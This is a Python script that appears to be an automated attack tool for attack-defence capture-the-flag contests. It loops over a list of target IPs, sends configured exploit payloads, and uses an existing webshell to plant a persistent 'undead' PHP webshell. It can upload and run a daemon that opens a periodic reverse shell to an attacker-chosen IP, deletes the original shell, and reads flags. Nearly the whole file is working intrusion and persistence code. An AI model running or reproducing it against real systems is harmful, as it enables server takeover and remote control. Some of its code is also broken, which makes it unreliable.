from optparse import OptionParser
import configparser
import random
import os
import requests
import re
import time
import base64

SCRIPT_DIR = os.path.dirname(__file__)
UALIST = SCRIPT_DIR + 'lib/ua.txt'
IPLIST = SCRIPT_DIR + 'files/ip.txt'
PAYLOADLIST = SCRIPT_DIR + 'files/payload.txt'
DOORFILE = SCRIPT_DIR + "files/door.txt"
KEKONGFILE = SCRIPT_DIR + 'lib/kekong.py'

def getPayloadConf(filename):
    dilapidatedPayload = {}
    init = configparser.ConfigParser()
    init.read(filename)
    payloads = init.sections()
    for i, payload in enumerate(payloads):
        dilapidatedPayload[payload] = {}
        options = init.options(payload)
        try:
            init.get(payload, "method")
            init.get(payload, "getparam")
            init.get(payload, "webshellreturn")
            init.get(payload, "signal")
        except configparser.NoOptionError:
            message("'method','getparam','webshellreturn' is required, please check "+PAYLOADLIST, 0)
            exit()
        if init.get(payload, "method") == "post":
            try:
                init.get(payload, "postparam")
            except configparser.NoOptionError:
                message("postparam at post payload is required.", 0)
                exit()
        if init.get(payload, "webshellreturn") == "true":
            if init.get(payload, "webshellpath") == "" or init.get(payload, "webshellpass") == "":
                message("when webshellreturn is true webshellpath and webshellpass is required", 0)
                exit()
        for header in options:
            if init.get(payload, "signal") != "":
                dilapidatedPayload[payload][header] = init.get(payload, header)
            if init.get(payload, "webshellreturn") == "true":
                dilapidatedPayload[payload][header] = init.get(payload, header)
            if init.get(payload, "webshellreturn") == "false":
                if header == "webshellpath" or header == "webshellpass":
                    pass
                else:
                    dilapidatedPayload[payload][header] = init.get(payload, header)
    return dilapidatedPayload

def packagePayload(singleDilapidatedPayload):
    method = list()
    signal = ""
    readflag = ""
    webshellParam = dict()
    requestHeader = dict()
    requestCookie = dict()
    postParam = dict()
    ifWebshell = checkIfWebshell(singleDilapidatedPayload)
    if not singleDilapidatedPayload.has_key('user-agent'): singleDilapidatedPayload['User-Agent'] = getRandomUa(UALIST)
    if not singleDilapidatedPayload.has_key('cookie'): requestCookie = {"BAIDUID=E6AA4FB4E32B:FG": '1', "BIDUPSID": "E6AA4BA3961F81B", "PSTM": '1549104'}
    for header, value in singleDilapidatedPayload.items():
        if header in ["webshellreturn", "webshellpass", "webshellpath", "method", "postparam", "getparam", "signal", "readflag"]:
            if header == "method": method.append(value)
            if header == "signal" and value != "": signal = value
            if header == "webshellreturn" and value.lower() == "true":
                webshellParam['webshellpath'] = singleDilapidatedPayload['webshellpath']
                webshellParam['webshellpass'] = singleDilapidatedPayload['webshellpass']
            if header == "getparam": getParam = singleDilapidatedPayload['getparam']
            if header == "postparam" and singleDilapidatedPayload['postparam'] != "":
                postParam = spiltRequest(singleDilapidatedPayload['postparam'], "&", "=")
            if header == "readflag" and singleDilapidatedPayload['readflag'] != "":
                readflag = singleDilapidatedPayload['readflag']
        elif header in ["cookie"]:
            requestCookie = spiltRequest(value, ", ", "=")
        else:
            requestHeader[header] = value
    return method, getParam, requestHeader, requestCookie, ifWebshell, webshellParam, postParam, signal, readflag


def Start(dilapidatedPayload):
    for singlePayload in dilapidatedPayload:
        method, getParam, requestHeader, requestCookie, ifWebshell, webshellParam, postParam, signal, readflag = packagePayload(dilapidatedPayload[singlePayload])
        firstAttack(method, getParam, requestHeader, requestCookie, ifWebshell, webshellParam, postParam, signal, readflag)

def firstAttack(method, getparam, requestHeader, requestCookie, ifWebshell, webshellParam, postParam, signal=None, readflag=None):
    ips = getTargetIp(IPLIST)
    webshellPostParam = dict()
    for ip in ips:
        url = ip + getparam
        request = connection(url, method, requestHeader, requestCookie, timeout=5, maxRetries=3, postParam=postParam).request()
        responseText = request.text
        if ifWebshell is True:

            # init
            webshellUrl = ip + webshellParam['webshellpath']
            try:
                index = webshellUrl.replace(webshellUrl.split("/")[-1], "index.php")
                ifIndex = connection(index, "post", headers={"user-agent": getRandomUa(UALIST)}, cookie=None, timeout=3, maxRetries=3, postParam=webshellPostParam).request()
                if ifIndex.status_code != 200:
                    message("index.php not found. undead webshell will not effect. please make sure index.php is exist.", 0)
                    break
            except AttributeError:
                message("request error, please check url: " + index, 0)
                break

            # if daemon, put it on target and execute
            if parseArguments().reverseip is not None:
                port = random.randint(10001, 15001)
                reverseTime = parseArguments().time
                reverseIp = parseArguments().reverseip
                content = getDeamon(KEKONGFILE, reverseIp, port, reverseTime)
                content = "file_put_contents('kekong.py',base64_decode('" + content + "'));"
                webshellPostParam = {webshellParam['webshellpass']: content}
                connection(webshellUrl, "post", headers={"user-agent": getRandomUa(UALIST)}, cookie=None, timeout=3,
                           maxRetries=3, postParam=webshellPostParam).request()
                webshellPostParam = {webshellParam['webshellpass']: "system('python kekong.py');"}
                connection(webshellUrl, "post", headers={"user-agent": getRandomUa(UALIST)}, cookie=None, timeout=3,
                           maxRetries=3, postParam=webshellPostParam).request()
                message("daemon on "+ip+" is running, reverse shell to "+str(reverseIp)+":"+str(port)+" per "+reverseTime+" seconds", 1)

            # first, put undead shell into target
            newWebshellName = str(random.randint(1000000, 9999999)) + ".php"
            undeadShellContent, undeadShellName = getWebShell(DOORFILE)
            content = "file_put_contents('" + newWebshellName + "',base64_decode('" + undeadShellContent + "'));"
            webshellPostParam = {webshellParam['webshellpass'] : content}
            checkWebshellConnection = connection(webshellUrl, "post", headers={"user-agent": getRandomUa(UALIST)},cookie=None, timeout=3, maxRetries=3, postParam=webshellPostParam)
            try:
                result = checkWebshellConnection.request()
                if result.status_code != 200:
                    message('new webshell not found', 0)
            except AttributeError:
                message("request error, please check url: " + webshellUrl, 0)
                break

            # second, request to generate undead shell
            newShellPath = webshellUrl.replace(webshellUrl.split("/")[-1], newWebshellName)
            generateUndeadShell = connection(newShellPath, "get", headers={"user-agent": getRandomUa(UALIST)}, timeout=1, maxRetries=1, postParam=None, error='ignore')
            try:
                generateUndeadShell.request()
            except AttributeError:
                message("request error, please check url: " + newShellPath, 0)
            except:
                pass

            # third, check if undead is success
            undeadShellPath = webshellUrl.replace(webshellUrl.split("/")[-1], undeadShellName)
            checkUndeadShell = connection(undeadShellPath, "post", headers={"user-agent": getRandomUa(UALIST)}, timeout=5, maxRetries=3, postParam={"sxsx23":"cGhwaW5mbygpOw=="})
            try:
                time.sleep(1)  # make sure undead shell is generated
                request = checkUndeadShell.request()
                if request.status_code != 200:
                    message("undead webshell not found", 0)
                    break
                if request.text.find("PHP Version") >= 0:
                    message("webshell at http://" + webshellUrl.replace(webshellUrl.split("/")[-1], undeadShellName), 1)
                else:
                    message("undead webshell errors, please check connection with http://" + webshellUrl.replace(webshellUrl.split("/")[-1], undeadShellName), 0)
            except AttributeError:
                message("request error, please check url: " + undeadShellPath, 0)
                break

            # finally, remove the webshell
            rmWebshellPostParam = {webshellParam['webshellpass']: "unlink('"+webshellUrl.split("/")[-1]+"');"}
            try:
                rmWebshellPost = connection(webshellUrl, method="post", headers={"user-agent": getRandomUa(UALIST)},maxRetries=1, postParam=rmWebshellPostParam)
                rmWebshellPost.request()
            except AttributeError:
                message("request error, please check url: " + webshellUrl, 0)
                break

            # get flag
            if readflag is not None:
                try:
                    getflag = connection(undeadShellPath, "post", headers={"user-agent": getRandomUa(UALIST)}, timeout=5, maxRetries=3, postParam={"sxsx23": base64.b64encode(readflag)}).request()
                    if len(getflag.text) > 50:
                        message("response is too long, please get flag manually", 0)
                    else:
                        message(getflag.text, 1)
                except AttributeError:
                    message("request error, please check url: " + undeadShellPath, 0)
            return ifWebshell, ip, undeadShellPath

        if ifWebshell is False:
            print("this is non-webshell function")
            pattern = re.compile(signal)
            try:
                find = re.search(pattern, responseText).group(0)
                message("find the flag at ====> "+find, 1)
            except AttributeError:
                message("request error, please check url: " + url, 0)
            except:
                message("regexp is wrong, can not find signal.", 0)

def checkIfWebshell(payload):
    if payload['webshellreturn'].lower() == "false" : return False
    if payload['webshellreturn'].lower() == "true" : return True
    return "webshell config is wrong"

def checkIfSignal(payload):
    if payload['signal'] == "" : return False
    if payload['signal'] != "" : return True
    return "signal config is wrong"

def spiltRequest(str, bigSign, smallSign):
    result = {}
    prepare = str.split(bigSign)
    for oneParam in prepare:
        end = re.search(".*?"+smallSign, oneParam).span()[1]
        key = oneParam[:end-1]
        value = oneParam[end:]
        result[key] = value
    return result

def getRandomUa(filename):
    userAgent = {}
    i = 1
    for ua in open(filename, "rU").readlines():
        userAgent[i] = ua.strip("\n")
        i = i + 1
    return userAgent[random.randint(1, 17)]

def parseArguments():
    usage = "Usage: %prog [-t|--time] interval"
    parser = OptionParser(usage)
    parser.add_option("-t", "--time", dest="interval_time", default='360', help="attack interval time, default by sec")
    parser.add_option("-r", "--reverse", dest="reverseip", default=None, help="which ip you want to reverse")
    parser.add_option("-i", "--reversetime", dest="time", default=5, help="reverse shell interval time, default by sec")
    (options, args) = parser.parse_args()
    return options

def getRandomStr(length):
    result = ""
    for i in range(0, length):
        result = result + random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
    return result

def getTargetIp(filename):
    ipList = []
    try:
        targetIp = open(filename, "r")
        for line in targetIp.readlines():
            ipList.append(line.strip("\n"))
        targetIp.close()
    except:
        pass
    return ipList


def message(message,type):
    if type == 1:
        print("[+] "+message)
    elif type == 0:
        print("[-] "+message)

def getDeamon(filename, ip, port, time):
    file_object = open(filename, "r")
    try:
        allTheText = file_object.read()
        allTheText = allTheText.replace("{port}", str(port))
        allTheText = allTheText.replace('{ip}', str(ip))
        allTheText = allTheText.replace('{time}', str(time))
        file_object.close()
    except Exception,e:
        message("error occur when reading "+filename, 0)
        print e
    return base64.b64encode(allTheText)

def getWebShell(filename):
    file_object = open(filename, "r")
    try:
        allTheText = file_object.read()
        shellName = getRandomStr(9)+".php"
        allTheText = allTheText.replace('{name}', shellName)
        file_object.close()
    except:
        pass
    return base64.b64encode(allTheText), shellName

class connection(object):
    header = {
            'Accept-Language': 'en-us',
            'Accept-Encoding': 'identity',
            'Keep-Alive': '300',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
    }
    def __init__(self, url, method, headers=None, cookie=None, timeout=20, maxRetries=3, postParam=None, error=None):
        if url[:4].find("http") <= 0:
            self.url = "http://" + url
        self.timeout = timeout
        self.postParam = postParam
        self.maxRetries = maxRetries
        if cookie is not None:
            self.cookie = cookie
        else:
            self.cookie = None
        self.headers = headers
        self.method = "".join(method)
        self.error = error

    def request(self):
        i = 1
        response = ""
        for i in range(0, self.maxRetries):
            try:
                if self.method.lower() == "get":
                    if self.cookie is not None:
                        response = requests.get(url=self.url, headers=self.headers, timeout=self.timeout, cookies=self.cookie)
                    else:
                        response = requests.get(url=self.url, headers=self.headers, timeout=self.timeout)
                    break
                if self.method.lower() == "post":
                    if self.cookie is not None:
                        response = requests.post(url=self.url, headers=self.headers, timeout=self.timeout,cookies=self.cookie ,data=self.postParam)
                    else:
                        response = requests.post(url=self.url, headers=self.headers, timeout=self.timeout,
                                                 data=self.postParam)
                    break
            except:
                pass
            finally:
                i = i + 1
        if self.error == "ignore":
            pass
        else:
            if response == "":
                message("something error occured when requesting "+self.url, 0)
        if i > self.maxRetries:
            print("CONNECTION TIMEOUT: There was a problem in the request to: " + self.url)
        return response

def main():
    intervalTime = parseArguments().interval_time
    i = 1
    message("intervalTime is " + intervalTime, 1)
    message("initializing payload config", 1)
    config = getPayloadConf(PAYLOADLIST)
    message("initialization complete", 1)

    while 1:
        print(">>>>>>>>>>>>>>>>>>>>>>>term " + str(i) + " start<<<<<<<<<<<<<<<<<<<<<<<")
        message(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), 1)
        Start(config)
        print(">>>>>>>>>>>>>>>>>>>>>>>term " + str(i) + " end  <<<<<<<<<<<<<<<<<<<<<<<")
        time.sleep(int(intervalTime))
        i = i + 1

if __name__ == '__main__':
    main()
